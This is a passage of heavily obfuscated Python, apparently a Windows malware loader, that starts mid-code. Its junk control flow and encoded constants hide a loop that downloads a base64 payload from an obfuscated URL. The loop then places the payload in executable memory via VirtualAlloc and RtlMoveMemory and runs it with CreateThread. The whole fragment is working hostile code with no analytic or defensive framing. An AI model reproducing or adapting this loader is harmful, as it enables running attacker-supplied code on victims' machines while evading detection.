                raise MemoryError([(lambda : (lambda _811: _811 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _61 = [[(lambda : (lambda _1213: _1213 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _47: _47 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742712, 16742704, 16742703]))))())())()])
        raise MemoryError([(lambda : (lambda _1517: _1517 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _46:
        try:
            raise MemoryError(__4853846879248)
        except MemoryError as __3263059155314:
            if __3263059155314.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))():
                kernel32.WaitForSingleObject.restype = wt.DWORD
            if __3263059155314.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x03'))():
                __3826961826267 = (lambda : R_E_D__A_V(b'R_E_D__A_V__\xf9\xday_\xdc\x1a'))()
            if __3263059155314.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x04'))():
                __8630617629094 = (lambda : R_E_D__A_V(b'R_E_D__A_V__+p)\x82]\x9a'))()
            if __3263059155314.args[(lambda : R_E_D__A_V(b'R_E_D__A_V__'))()] == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x05'))():
                __7768946549050 = (lambda : R_E_D__A_V(b"R_E_D__A_V__'\x93L\t+\x8e"))()
try:
    match '148' == '510':
        case True:
            raise MemoryError([True])
        case False:
            _316 = [[True], [False]]
            R_E_D__A_V______(['_1510'])
    raise MemoryError([True])
except MemoryError as _914:
    try:
        match (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742711, 16742704, 16742705]))))())())() == (lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742704, 16742703, 16742709]))))())())():
            case True:
                raise MemoryError([(lambda : (lambda _1819: _1819 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
            case False:
                _1113 = [[(lambda : (lambda _1512: _1512 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()], [(lambda : (lambda _414: _414 - (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()]]
                R_E_D__A_V______([(lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [16742750, 16742704, 16742710, 16742704, 16742706]))))())())()])
        raise MemoryError([(lambda : (lambda _213: _213 + (lambda : ______R_E_D__A_V_______(30584))())(0) == 1)()])
    except MemoryError as _92:
        while (lambda : (lambda _132: _132 + (lambda : ______R_E_D__A_V_______((lambda : R_E_D__A_V(b'R_E_D__A_V__wx'))()))())((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()) == (lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())():
            try:
                buf = base64.b64decode(urllib.request.urlopen((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy9'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyv'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyu'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyo'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyf'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy1'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy0'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyw'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyb'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyn'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyq'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyg'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyc'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyr'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyl'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy`'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy.'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyB'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyk'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyh'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyd'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffym'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyA'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyW'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyC'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy-'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffya'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy5'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy3'))()]))))())())()).read().decode((lambda : (lambda : (lambda : R_E_D__A_V____(______________R_E_D__A_V______________(R_E_D__A_V______________(R_E_D__A_V_______________, [(lambda : R_E_D__A_V(b'R_E_D__A_V__\xffyt'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffys'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffye'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy,'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__\xffy7'))()]))))())())()))
                memAddr = kernel32.VirtualAlloc(None, len(buf), (lambda : R_E_D__A_V(b'R_E_D__A_V__0\x00'))(), (lambda : R_E_D__A_V(b'R_E_D__A_V__@'))())
                kernel32.RtlMoveMemory(memAddr, buf, len(buf))
                th = kernel32.CreateThread(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_void_p(memAddr), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))()), ctypes.pointer(ctypes.c_int((lambda : R_E_D__A_V(b'R_E_D__A_V__'))())))
                kernel32.WaitForSingleObject(th, -(lambda : R_E_D__A_V(b'R_E_D__A_V__\x01'))())
                break
            except Exception:
                continue